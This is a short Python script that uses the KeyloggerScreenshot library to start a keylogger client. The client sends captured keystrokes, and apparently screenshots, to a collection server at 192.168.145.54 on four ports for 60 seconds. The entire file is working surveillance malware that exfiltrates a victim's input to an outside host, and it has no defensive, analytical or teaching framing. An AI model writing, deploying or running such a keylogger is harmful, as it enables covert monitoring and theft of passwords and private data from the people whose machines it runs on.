import KeyloggerScreenshot as ks 

ip = '192.168.145.54'
key_client = ks.KeyloggerTarget(ip, 6413, ip, 4529, ip, 7462, ip, 4791, duration_in_seconds=60) 
key_client.start()